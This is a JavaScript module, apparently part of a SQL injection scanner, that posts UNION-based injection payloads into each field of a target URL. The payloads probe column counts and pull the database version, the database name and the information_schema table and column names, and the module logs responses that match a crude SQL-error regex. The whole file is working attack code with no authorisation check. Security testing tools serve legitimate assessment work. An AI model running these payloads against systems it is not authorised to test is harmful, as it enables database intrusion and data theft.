// scanner/engine/engine-union.js
const axios = require('axios');

async function testUnionBased(url, method = 'POST', headers = {}, fields = []) {
  const results = [];

  const unionPayloads = [
    "' UNION SELECT null--",
    "' UNION SELECT null, null--",
    "' UNION SELECT null, null, null--",
    "' UNION SELECT 1, 2, 3--",
    "' UNION SELECT version(), database()--",
    "' UNION SELECT table_name, column_name FROM information_schema.columns--"
  ];

  for (const field of fields) {
    for (const payload of unionPayloads) {
      const data = {};
      data[field] = payload;

      try {
        const response = await axios({
          method,
          url,
          headers,
          data,
          timeout: 6000
        });

        const text = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        if (/sql|syntax|error|database|root|version/i.test(text)) {
          results.push({
            engine: 'union',
            field,
            payload,
            status: response.status,
            evidence: text.slice(0, 300)
          });
        }
      } catch (err) {
        results.push({
          engine: 'union',
          field,
          payload,
          error: err.message
        });
      }
    }
  }

  return results;
}

module.exports = testUnionBased;
